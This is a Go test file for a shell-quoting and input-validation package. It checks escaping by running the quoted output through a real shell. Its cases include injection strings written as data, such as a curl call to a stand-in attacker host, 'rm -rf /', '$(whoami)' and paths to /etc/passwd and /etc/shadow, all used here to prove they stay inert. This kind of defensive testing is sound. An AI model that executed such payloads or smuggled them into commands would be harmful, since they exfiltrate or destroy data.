package shellquote

// quote_test.go 转义工具的守卫。
//
// 关键：不只做字符串比对，而是把 Quote 的结果交给**真实 shell** 求值，
// 验证「求值结果 == 原字符串」。这是语义保证，不是形式保证——
// 任何"看起来对了"的转义实现都能骗过字符串断言，但骗不过 sh -c。

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"testing"
)

// shProbe 是本机可用的 POSIX shell 启动命令（nil=无）。
// 语义保证必须交给真 shell 验：形式断言（字符串比对）能骗过"看起来对"的实现，
// 骗不过 sh -c 的求值。因此在 Windows 开发机上也尽量找到可用 shell
// （git-bash 的 sh 或 WSL），找不到才跳过——而不是默认 Windows 就跳过。
var shProbe = func() []string {
	if _, err := exec.LookPath("sh"); err == nil {
		return []string{"sh", "-c"}
	}
	for _, cand := range []string{
		`C:\Program Files\Git\bin\bash.exe`,
		`C:\Program Files\Git\usr\bin\bash.exe`,
		`C:\Program Files (x86)\Git\bin\bash.exe`,
	} {
		if _, err := os.Stat(cand); err == nil {
			return []string{cand, "-c"}
		}
	}
	if _, err := exec.LookPath("wsl"); err == nil {
		return []string{"wsl", "sh", "-c"}
	}
	return nil
}()

// shellEval 让真实 shell 求值给定脚本体。
func shellEval(t *testing.T, script string) string {
	t.Helper()
	if shProbe == nil {
		t.Skip("no POSIX shell available on this host")
	}
	out, err := exec.Command(shProbe[0], append(shProbe[1:], script)...).CombinedOutput()
	if err != nil {
		t.Fatalf("shell 求值 %q 失败: %v (%s)", script, err, out)
	}
	return string(out)
}

// shellEcho 让真实 shell 求值 `printf '%s' <quoted>`，返回结果字符串。
func shellEcho(t *testing.T, quoted string) string {
	t.Helper()
	return shellEval(t, "printf '%s' "+quoted)
}

func TestQuoteRoundTripsThroughRealShell(t *testing.T) {
	if shProbe == nil {
		t.Skip("no sh on this host")
	}
	cases := []string{
		"",
		"plain",
		"with space",
		"has'single'quote",
		`x"; curl -s http://attacker/$PWN ; echo "`,
		"$(whoami)",
		"`id`",
		"a; rm -rf /",
		"a | tee /etc/passwd",
		"a && b || c",
		"newline\ninjected",
		"\\backslash\\",
		"*glob*?[]",
		"../../etc/shadow",
		"日本語ユーザ",
		strings.Repeat("'", 8), // 连排单引号：'\'' 边界
	}
	for _, c := range cases {
		got := shellEcho(t, Quote(c))
		if got != c {
			t.Errorf("Quote(%q) 求值结果 = %q，不等于原串（注入或语义改变）", c, got)
		}
	}
}

// TestQuoteCannotInjectCommands 最关键的守卫：即使用户输入是完整命令，
// 求值结果也必须是它的字面文本，且不得产生副作用文件。
func TestQuoteCannotInjectCommands(t *testing.T) {
	if shProbe == nil {
		t.Skip("no sh on this host")
	}
	payload := "x'; touch /tmp/shellquote-pwned; echo 'y"
	got := shellEcho(t, Quote(payload))
	if got != payload {
		t.Fatalf("求值结果 = %q，want %q", got, payload)
	}
	if _, err := exec.Command("test", "-e", "/tmp/shellquote-pwned").Output(); err == nil {
		_ = exec.Command("rm", "-f", "/tmp/shellquote-pwned").Run()
		t.Fatal("注入了额外命令：/tmp/shellquote-pwned 被创建")
	}
}

func TestQuoteShape(t *testing.T) {
	cases := []struct{ in, want string }{
		{"", "''"},
		{"plain", "'plain'"},
		{"a'b", `'a'\''b'`},
		{"'", `''\'''`},
		{"''", `''\'''\'''`},
		{"'''", `''\'''\'''\'''`},
		{`x'; touch /tmp/pwned; echo 'y`, `'x'\''; touch /tmp/pwned; echo '\''y'`},
	}
	for _, c := range cases {
		if got := Quote(c.in); got != c.want {
			t.Errorf("Quote(%q) = %q, want %q", c.in, got, c.want)
		}
		if len(c.in) > 0 && len(Quote(c.in)) < len(c.in)+constSingleQuote {
			t.Errorf("Quote(%q) = %q 短于最小包裹长度（剥壳风险）", c.in, Quote(c.in))
		}
	}
}

func TestQuoteJoin(t *testing.T) {
	want := "'a b' 'c'"
	if got := QuoteJoin(" ", "a b", "c"); got != want {
		t.Errorf("QuoteJoin = %q, want %q", got, want)
	}
	if got := QuoteJoin(" "); got != "" {
		t.Errorf("空参数应返回空串，得 %q", got)
	}
}

func TestValidateHost(t *testing.T) {
	good := []string{"localhost", "10.30.0.1", "db-01.internal", "a"}
	bad := []string{"", "-lead", "trail-", "a..b", "sp ace", "hos/t", "$(id)",
		strings.Repeat("x", 64), "host:name"}
	for _, g := range good {
		if err := ValidateHost(g); err != nil {
			t.Errorf("ValidateHost(%q) 误拒: %v", g, err)
		}
	}
	for _, b := range bad {
		if err := ValidateHost(b); err == nil {
			t.Errorf("ValidateHost(%q) 应拒", b)
		}
	}
}

func TestValidateIdent(t *testing.T) {
	good := []string{"root", "ops_user", "svc.db", "a-b"}
	bad := []string{"", "-x", "a b", "a;b", "$(id)", "用户", strings.Repeat("z", 33)}
	for _, g := range good {
		if err := ValidateIdent(g); err != nil {
			t.Errorf("ValidateIdent(%q) 误拒: %v", g, err)
		}
	}
	for _, b := range bad {
		if err := ValidateIdent(b); err == nil {
			t.Errorf("ValidateIdent(%q) 应拒", b)
		}
	}
}

func TestValidatePortAndParsePort(t *testing.T) {
	for _, p := range []int{1, 22, 65535} {
		if err := ValidatePort(p); err != nil {
			t.Errorf("ValidatePort(%d) 误拒: %v", p, err)
		}
	}
	for _, p := range []int{0, -1, 65536} {
		if err := ValidatePort(p); err == nil {
			t.Errorf("ValidatePort(%d) 应拒", p)
		}
	}
	if n, err := ParsePort("22"); err != nil || n != 22 {
		t.Errorf("ParsePort(22) = %d, %v", n, err)
	}
	for _, s := range []string{"", "abc", "0", "99999", "22;id"} {
		if _, err := ParsePort(s); err == nil {
			t.Errorf("ParsePort(%q) 应拒", s)
		}
	}
}

func TestValidatePath(t *testing.T) {
	good := []string{"/var/backups/etcd", "/tmp/a-b_c.9"}
	bad := []string{"", "relative/path", "/a/../b", "/a b", "/a;b", "/a$(id)", "/a'b"}
	for _, g := range good {
		if err := ValidatePath(g); err != nil {
			t.Errorf("ValidatePath(%q) 误拒: %v", g, err)
		}
	}
	for _, b := range bad {
		if err := ValidatePath(b); err == nil {
			t.Errorf("ValidatePath(%q) 应拒", b)
		}
	}
}

// TestValidateErrorNamesField 错误信息必须含原值——运维要靠它定位是哪个字段错了。
func TestValidateErrorNamesField(t *testing.T) {
	err := ValidateHost("bad host")
	if err == nil || !strings.Contains(err.Error(), "bad host") {
		t.Errorf("错误未含原值: %v", err)
	}
	if msg := ValidateIdent("a b").Error(); !strings.Contains(msg, fmt.Sprintf("%q", "a b")) {
		t.Errorf("错误未引用字段值: %s", msg)
	}
}
